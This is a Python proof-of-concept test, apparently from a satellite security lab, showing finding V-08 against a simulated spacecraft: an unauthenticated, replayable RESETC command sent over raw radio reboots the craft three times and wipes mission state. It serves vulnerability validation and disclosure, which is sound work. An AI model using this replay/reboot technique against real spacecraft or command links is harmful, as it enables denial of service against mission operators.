#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


def _craft_back(dev):
    """Encrypted PING: on both targets the secure link survives a soft
    reboot (fresh boot counter, volatile state lost, but no V-21 cookie was
    written). encrypt=True bypasses the host-side mirror so a stray frame
    can never desync this probe."""
    try:
        tms = dev.tc(0x01, b"", via="radio", encrypt=True)
    except Exception:
        return False
    return bool(dev.find(tms, 0x01))


def main(dev, ev):
    # V0-08: RESETC reboots the craft with no authentication -- a raw-radio
    # DoS at will. The secure link wraps the frame but adds no freshness
    # (the same ciphertext is valid forever), so the reboot is still an
    # unauthenticated action; the baseline also has no boot counter the
    # mission could notice the replays with (V-21).
    for i in range(3):
        prev = dev.sim.boot_count
        dev.tc(0x02, b"", via="radio", encrypt=True)   # replayable, unauthenticated
        rebooted = False
        for _ in range(15):
            dev.advance(1000)
            if _craft_back(dev):
                rebooted = True
                break
        check(rebooted, f"reset #{i+1}: RESETC must be executed and the "
                        f"craft back on the wire within 15 s")
        ev.log(f"reset #{i+1} issued from raw radio; craft back: True "
               f"(boot count was {prev})")
    st = dev.tc(0x0C, b"", via="usb")
    s = dev.find(st, 0x0C)[0]
    ev.log(f"mode after resets: 0x{s.u8(1):02X} (NOMINAL again, state lost)")
    check(s.u8(1) == 0x01, "soft reset rewinds mission state")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-08 RESETC unauthenticated reboot-DoS", main))
